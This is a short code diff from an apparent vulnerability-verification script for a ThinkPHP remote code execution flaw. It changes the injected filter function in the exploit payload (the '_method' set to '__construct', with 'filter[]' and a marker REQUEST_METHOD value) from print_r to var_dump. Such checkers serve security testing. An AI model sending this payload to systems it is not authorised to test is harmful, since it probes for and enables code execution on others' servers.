@@ -20,7 +20,7 @@ def thinkphp_construct_debug_rce_verify(url):
     }
     payload = {
         '_method':'__construct',
-        'filter[]':'print_r',
+        'filter[]':'var_dump',
         'server[REQUEST_METHOD]':'56540676a129760a3',
     }
     try:
